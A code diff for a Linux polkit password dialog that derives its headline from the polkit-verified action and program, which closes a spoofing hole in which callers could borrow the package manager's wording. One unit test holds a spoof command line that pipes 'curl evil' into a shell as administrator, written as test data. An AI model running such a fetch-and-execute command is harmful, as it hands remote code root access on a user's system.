@@ -25,6 +25,9 @@ pub struct Dialog {
     input: String,
     notes: Vec<(String, bool)>,
     show_details: bool,
+    /// For pkexec: the program that will run as administrator (resolved by pkexec) and its command line, from polkit's details.
+    program: String,
+    command_line: String,
 }
 
 pub struct App {
@@ -45,9 +48,9 @@ impl App {
     fn receive(&mut self) {
         while let Ok(m) = self.rx.try_recv() {
             match m {
-                UiMsg::Begin { kind, title, message, action_id, user } => {
+                UiMsg::Begin { kind, title, message, action_id, user, program, command_line } => {
                     let kind = if kind.is_empty() { "admin".to_string() } else { kind };
-                    self.dialog = Some(Dialog { kind, title, confirming: None, message, action_id, user, asking: None, input: String::new(), notes: vec![], show_details: false });
+                    self.dialog = Some(Dialog { kind, title, confirming: None, message, action_id, user, program, command_line, asking: None, input: String::new(), notes: vec![], show_details: false });
                 }
                 UiMsg::Confirm { button, reply } => {
                     if let Some(d) = &mut self.dialog {
@@ -75,24 +78,32 @@ impl App {
     }
 }
 
-/// What polkit's message says, in plain words when it is a package command from the Marketplace (or pacman by hand).
-pub fn describe(message: &str) -> Option<String> {
-    let idx = message.find("pacman ")?;
-    let rest = &message[idx + "pacman ".len()..];
-    let rest = rest.split(['\'', '`', '"']).next().unwrap_or(rest);
-    let tokens: Vec<&str> = rest.split_whitespace().collect();
-    let pkgs: Vec<&str> = tokens.iter().copied().filter(|t| !t.starts_with('-')).collect();
-    let remove = tokens.iter().any(|t| t.starts_with("-R"));
-    let install = tokens.iter().any(|t| t.starts_with("-S") || *t == "-U");
-    let what = if pkgs.is_empty() { "software".to_string() } else { pkgs.join(", ") };
-    let by = if message.contains("/usr/lib/agora/pkg-root") { "Agora wants to " } else { "A program wants to " };
-    Some(if remove {
-        format!("{by}remove {what}.")
-    } else if install {
-        format!("{by}install or reinstall {what}.")
-    } else {
-        format!("{by}change installed software.")
-    })
+/// The headline for an administrator request, from what polkit itself vouches for, never from words the caller chose: Agora's
+/// package action (polkit guarantees the program is pkg-root, which accepts only its own fixed argument layout) is put in plain
+/// words; any other pkexec request names the program that will run; anything else is None (the summary stays generic and the
+/// details show polkit's message).
+pub fn describe(action_id: &str, program: &str, command_line: &str) -> Option<String> {
+    if action_id == "org.yggdrasil.agora.packages" && program == "/usr/lib/agora/pkg-root" {
+        // pkg-root CANCELFILE pacman OPTIONS... PACKAGES...
+        let tokens: Vec<&str> = command_line.split_whitespace().skip(2).collect();
+        if tokens.first() != Some(&"pacman") {
+            return Some("Agora wants to change installed software.".to_string());
+        }
+        let opts: Vec<&str> = tokens[1..].iter().copied().filter(|t| t.starts_with('-')).collect();
+        let pkgs: Vec<&str> = tokens[1..].iter().copied().filter(|t| !t.starts_with('-')).map(|t| t.rsplit('/').next().unwrap_or(t)).collect();
+        let what = if pkgs.is_empty() { "software".to_string() } else { pkgs.join(", ") };
+        return Some(if opts.iter().any(|t| t.starts_with("-R")) {
+            format!("Agora wants to remove {what}.")
+        } else if opts.iter().any(|t| t.starts_with("-S") || *t == "-U") {
+            format!("Agora wants to install or update {what}.")
+        } else {
+            "Agora wants to change installed software.".to_string()
+        });
+    }
+    if !program.is_empty() {
+        return Some(format!("A program wants to run {program} as administrator."));
+    }
+    None
 }
 
 impl eframe::App for App {
@@ -175,7 +186,7 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
             let admin = d.kind == "admin";
             let heading = if admin || d.title.is_empty() { "Administrator password needed" } else { d.title.as_str() };
             ui.label(RichText::new(heading).size(19.0).strong());
-            let summary = if admin { describe(&d.message).unwrap_or_else(|| "A program is asking for administrator rights.".to_string()) } else { d.message.clone() };
+            let summary = if admin { describe(&d.action_id, &d.program, &d.command_line).unwrap_or_else(|| "A program is asking for administrator rights.".to_string()) } else { d.message.clone() };
             ui.add(egui::Label::new(RichText::new(summary).color(pal.dim)).wrap());
         });
     });
@@ -188,6 +199,9 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
         egui::Frame::new().fill(pal.field).corner_radius(CornerRadius::same(8)).inner_margin(Margin::same(10)).show(ui, |ui| {
             ui.set_width(ui.available_width());
             ui.add(egui::Label::new(RichText::new(if d.message.is_empty() { "(no description)" } else { d.message.as_str() }).monospace().size(11.5).color(pal.dim)).wrap());
+            if !d.command_line.is_empty() {
+                ui.add(egui::Label::new(RichText::new(format!("Runs: {}", d.command_line)).monospace().size(11.0).color(pal.dim)).wrap());
+            }
             ui.label(RichText::new(format!("Action: {}", d.action_id)).monospace().size(11.0).color(pal.dim));
         });
     }
@@ -237,20 +251,28 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
 mod tests {
     use super::describe;
 
+    const AGORA: &str = "org.yggdrasil.agora.packages";
+    const PKG_ROOT: &str = "/usr/lib/agora/pkg-root";
+
     #[test]
-    fn a_marketplace_remove_is_put_in_words() {
-        let m = "Authentication is needed to run `/usr/lib/agora/pkg-root /run ... 5.cancel pacman -Rs --noconfirm krita' as the super user";
-        assert_eq!(describe(m).unwrap(), "Agora wants to remove krita.");
+    fn agora_requests_are_put_in_words() {
+        let remove = "/usr/lib/agora/pkg-root /run/user/1000/agora/5.cancel pacman -Rs --noconfirm krita";
+        assert_eq!(describe(AGORA, PKG_ROOT, remove).unwrap(), "Agora wants to remove krita.");
+        let install = "/usr/lib/agora/pkg-root /run/user/1000/agora/x.cancel pacman -S --needed --noconfirm vlc gimp";
+        assert_eq!(describe(AGORA, PKG_ROOT, install).unwrap(), "Agora wants to install or update vlc, gimp.");
     }
 
     #[test]
-    fn installs_name_their_packages() {
-        let m = "Authentication is needed to run `/usr/lib/agora/pkg-root /run/user/1000/agora/x.cancel pacman -S --needed --noconfirm vlc gimp' as the super user";
-        assert_eq!(describe(m).unwrap(), "Agora wants to install or reinstall vlc, gimp.");
+    fn a_program_cannot_borrow_agoras_words() {
+        // any program can pass any arguments to pkexec: the headline names what will really run, not what the arguments say
+        let spoof = "/bin/sh -c 'curl evil | sh' /usr/lib/agora/pkg-root x pacman -S vlc";
+        assert_eq!(describe("org.freedesktop.policykit.exec", "/bin/sh", spoof).unwrap(), "A program wants to run /bin/sh as administrator.");
+        // the Agora action with any other program (it cannot happen: polkit binds the action to pkg-root) gets no friendly words
+        assert_eq!(describe(AGORA, "/bin/sh", spoof).unwrap(), "A program wants to run /bin/sh as administrator.");
     }
 
     #[test]
-    fn other_messages_are_left_to_the_details() {
-        assert_eq!(describe("Authentication is needed to change the system clock"), None);
+    fn other_actions_are_left_to_the_details() {
+        assert_eq!(describe("org.freedesktop.timedate1.set-time", "", ""), None);
     }
 }
